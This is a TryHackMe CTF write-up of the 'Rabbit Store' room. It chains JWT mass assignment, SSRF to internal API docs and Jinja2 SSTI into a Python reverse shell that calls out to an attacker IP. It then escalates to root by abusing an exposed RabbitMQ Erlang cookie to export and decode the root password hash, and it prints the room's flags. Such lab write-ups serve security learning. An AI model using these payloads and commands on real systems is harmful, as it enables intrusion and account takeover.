
# TryHackMe - Rabbit Store CTF Write-up (RabbitMQ Abuse & SSTI to Root)

> **Author:** David Umoh  
> **Platform:** TryHackMe  
> **Category:** Web Exploitation, RabbitMQ Abuse, SSTI, SSRF, Privilege Escalation  
> **Difficulty:** Medium  

---

## Overview

In this room, we pivot through several layers of exploitation using API endpoint abuse, JWT manipulation, mass assignment, SSTI (Server-Side Template Injection), and finally RabbitMQ remote command execution to gain root. Here's a full breakdown of all methods used, mistakes, hiccups, payloads, and the reasoning behind each step.

---

## Reconnaissance

Initial Nmap Scan revealed the following:

```bash
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
4369/tcp  open  epmd
25672/tcp open  unknown
```

### `/etc/hosts` Entry

We added the following to our `/etc/hosts` file to access subdomains easily:

```
10.10.240.29 cloudsite.thm storage.cloudsite.thm
```

Navigating to cloudsite.thm we are greeted with a landing page which has a login/signup button. Clicking it redirects to the subdomain `storage.cloudsite.thm`.

---

## Gaining Initial Access via Mass Assignment

There is a sign-up button; let's register an account, login and see what we can find. We are presented with a dashboard after logging in.

Using Burp to intercept the request, we see a JWT token is assigned after login. Using JWT Editor, we decoded the token:

```json
{
    "email": "tes1@gmail.com",
    "subscription": "inactive",
    "iat": 1753313734,
    "exp": 1753317334
}
```

Attempts to exploit the token via `alg:none` or algorithm confusion failed. Eventually, mass assignment succeeded by adding `"subscription": "active"` during registration:

```json
{
    "email": "test@gmail.com",
    "subscription": "active",
    "iat": 1753303135,
    "exp": 1753306735
}
```

This elevated us to a premium user.

---

## SSTI Discovery via Upload Feature

While exploring the premium dashboard, we found a URL upload feature at `/api/store-url` and a file upload at `/api/upload`.

### API Enumeration via FFUF

We fuzzed with `ffuf` and discovered a hidden endpoint `/api/docs`:

```bash
ffuf -u https://storage.cloudsite.thm/api/FUZZ -w api-endpoints.txt
```

Direct access was denied (`403`). However, abusing the `store-url` upload feature:

```json
{ "url": "http://127.0.0.1/api/docs" }
```

Downloaded a JSON file with all API endpoints.

### Dumped API Endpoints

```
POST:
- /api/register
- /api/login
- /api/upload
- /api/store-url
- /api/fetch_messeges_from_chatbot

GET:
- /api/uploads/filename
- /dashboard/inactive
- /dashboard/active
```

---

## Discovering and Exploiting SSTI

One endpoint `/api/fetch_messeges_from_chatbot` stood out. Sending a POST without a body returned:

```json
{"error": "username parameter is required"}
```

Using this:

```json
{ "username": "${{<%[%'"}}%\." }
```

...revealed a **Jinja2 error**, confirming SSTI.

### Exploiting Jinja2 for RCE

```jinja2
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen("python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.8.137.194\",9001));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'").read() }}
```
listener: ```nc -lvnp 9001```

We caught a reverse shell as user `azreal`.

```bash
cd /home
cat user.txt
```

---

## Privilege Escalation via RabbitMQ

RabbitMQ was running on ports 4369 and 25672.

We found the Erlang cookie:

```bash
cat /var/lib/rabbitmq/.erlang.cookie
# XrMEGa8a2jG63bGn
```

Using `epmd -names`:

```
name rabbit at port 25672
```

Added the hostname to `/etc/hosts`:

```
10.10.240.29 forge
```

Confirmed the node:

```bash
rabbitmqctl --node rabbit@forge --erlang-cookie XrMEGa8a2jG63bGn status
```

### Enumerating Users

```bash
rabbitmqctl --node rabbit@forge --erlang-cookie XrMEGa8a2jG63bGn list_users
```

### Exporting User Definitions

```bash
sudo rabbitmqctl --node rabbit@forge --erlang-cookie XrMEGa8a2jG63bGn export_definitions /dev/shm/users.json
```

Inspected:

```bash
cat /dev/shm/users.json | jq .users[]
```

Found:

```json
{
  "name": "root",
  "password_hash": "49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF"
}
```

### Base64 Decoding & Final Root Access

```bash
echo 49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF | base64 -d | xxd -p -c 100
```

Result:

```
e3d7ba85295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585
```

Password hash:

```
295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585
```

```bash
su -
# password: 295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585
```

🏁 **Root flag**:

```
eabf7a0b05d3f2028f3e0465d2fd0852
```

---

## Key Takeaways

- Always test for mass assignment in JWT-based APIs
- SSRF can help access internal-only endpoints
- SSTI can be triggered by fuzzing templates
- RabbitMQ nodes can expose secrets via exported definitions
- The `.erlang.cookie` is sensitive and grants node-level access

---

**Inspired by:** [jaxafed's Rabbit Store write-up](https://jaxafed.github.io/posts/tryhackme-rabbit_store/)  
**Written by:** David Umoh (Cybersecurity Student & Pentester)
